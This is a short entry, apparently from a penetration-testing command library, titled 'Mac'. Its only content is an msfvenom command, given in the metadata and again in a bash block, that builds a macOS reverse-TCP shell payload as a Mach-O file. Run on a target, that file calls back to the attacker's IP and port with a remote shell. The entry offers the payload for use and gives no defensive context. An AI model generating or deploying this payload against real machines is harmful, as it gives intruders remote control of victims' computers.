---
id: e4e886d9-2acf-40a5-a282-ebdd68ce7e8a
name: Mac
type: command
executor: bash
data: 'msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port
  to Connect On> -f macho > shell.macho

  '
output: null
created_at: '2020-07-14T18:14:34.234924+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mac

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

```


